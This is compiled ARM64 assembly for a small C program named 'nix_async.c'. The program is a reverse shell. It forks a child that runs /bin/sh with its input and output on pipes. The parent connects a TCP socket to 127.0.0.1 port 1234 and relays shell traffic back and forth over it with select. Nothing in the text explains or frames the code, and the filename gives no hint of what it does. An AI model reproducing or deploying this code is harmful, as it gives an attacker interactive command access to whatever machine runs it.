	.arch armv8-a
	.file	"nix_async.c"
	.section	.text.startup,"ax",@progbits
	.align	2
	.global	main
	.type	main, %function
main:
	sub	sp, sp, #8192
	sub	sp, sp, #176
	stp	x29, x30, [sp, -64]!
	add	x29, sp, 0
	add	x0, x29, 64
	stp	x19, x20, [sp, 16]
	stp	x21, x22, [sp, 32]
	stp	x23, x24, [sp, 48]
	bl	pipe
	add	x0, x29, 72
	bl	pipe
	bl	fork
	cbnz	w0, .L2
	ldr	w0, [x29, 64]
	mov	w1, 0
	bl	dup2
	ldr	w0, [x29, 76]
	mov	w1, 1
	bl	dup2
	ldr	w0, [x29, 76]
	mov	w1, 2
	bl	dup2
	ldr	w0, [x29, 64]
	bl	close
	ldr	w0, [x29, 68]
	bl	close
	ldr	w0, [x29, 72]
	bl	close
	ldr	w0, [x29, 76]
	bl	close
	adrp	x0, .LC0
	add	x1, x29, 96
	add	x0, x0, :lo12:.LC0
	mov	x2, 0
	stp	x0, xzr, [x29, 96]
	bl	execve
	b	.L3
.L2:
	mov	w22, w0
	ldr	w0, [x29, 64]
	mov	x21, 1
	add	x23, x29, 112
	bl	close
	ldr	w0, [x29, 76]
	bl	close
	mov	w2, 0
	mov	w1, 1
	mov	w0, 2
	bl	socket
	mov	w20, w0
	mov	w1, 2
	mov	w2, 16
	strh	w1, [x29, 80]
	mov	w1, -11772
	strh	w1, [x29, 82]
	mov	x1, 127
	movk	x1, 0x100, lsl 16
	str	x1, [x29, 84]
	add	x1, x29, 80
	bl	connect
	negs	w19, w20
	and	w0, w20, 63
	and	w19, w19, 63
	csneg	w19, w0, w19, mi
	lsl	x19, x21, x19
.L8:
	sxtw	x24, w20
.L7:
	mov	x0, 0
.L4:
	str	xzr, [x0, x23]
	add	x0, x0, 8
	cmp	x0, 128
	bne	.L4
	mov	x0, x24
	bl	__fdelt_chk
	mov	x4, 8432
	add	x1, x29, x4
	add	x0, x1, x0, lsl 3
	sub	x0, x0, #12288
	ldr	x1, [x0, 3968]
	orr	x1, x1, x19
	str	x1, [x0, 3968]
	ldrsw	x0, [x29, 72]
	bl	__fdelt_chk
	mov	x5, 8432
	ldr	w2, [x29, 72]
	add	x1, x29, x5
	mov	x4, 0
	mov	x3, 0
	add	x0, x1, x0, lsl 3
	negs	w1, w2
	sub	x0, x0, #12288
	and	w2, w2, 63
	and	w1, w1, 63
	csneg	w1, w2, w1, mi
	ldr	x2, [x0, 3968]
	lsl	x1, x21, x1
	orr	x1, x1, x2
	mov	x2, 0
	str	x1, [x0, 3968]
	mov	x1, x23
	mov	w0, 1024
	bl	select
	tbnz	w0, #31, .L5
	mov	x0, x24
	bl	__fdelt_chk
	mov	x3, 8432
	add	x1, x29, x3
	add	x0, x1, x0, lsl 3
	sub	x0, x0, #12288
	ldr	x0, [x0, 3968]
	tst	x19, x0
	beq	.L6
	add	x1, x29, 240
	mov	w0, w20
	mov	x2, 8192
	bl	read
	cmp	w0, 0
	ble	.L5
	sxtw	x2, w0
	ldr	w0, [x29, 68]
	add	x1, x29, 240
	bl	write
.L6:
	ldrsw	x0, [x29, 72]
	bl	__fdelt_chk
	ldr	w3, [x29, 72]
	negs	w1, w3
	and	w2, w3, 63
	and	w1, w1, 63
	csneg	w1, w2, w1, mi
	mov	x2, 8432
	add	x2, x29, x2
	add	x0, x2, x0, lsl 3
	lsl	x1, x21, x1
	sub	x0, x0, #12288
	ldr	x0, [x0, 3968]
	tst	x1, x0
	beq	.L7
	add	x1, x29, 240
	mov	w0, w3
	mov	x2, 8192
	bl	read
	cmp	w0, 0
	ble	.L5
	sxtw	x2, w0
	add	x1, x29, 240
	mov	w0, w20
	bl	write
	b	.L8
.L5:
	mov	w0, w22
	mov	w1, 17
	bl	kill
	mov	w0, w20
	bl	close
.L3:
	ldr	w0, [x29, 68]
	bl	close
	ldr	w0, [x29, 72]
	bl	close
	ldp	x19, x20, [sp, 16]
	mov	w0, 0
	ldp	x21, x22, [sp, 32]
	ldp	x23, x24, [sp, 48]
	ldp	x29, x30, [sp], 64
	add	sp, sp, 8192
	add	sp, sp, 176
	ret
	.size	main, .-main
	.section	.rodata.str1.1,"aMS",@progbits,1
.LC0:
	.string	"/bin/sh"
	.ident	"GCC: (Ubuntu/Linaro 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609"
	.section	.note.GNU-stack,"",@progbits
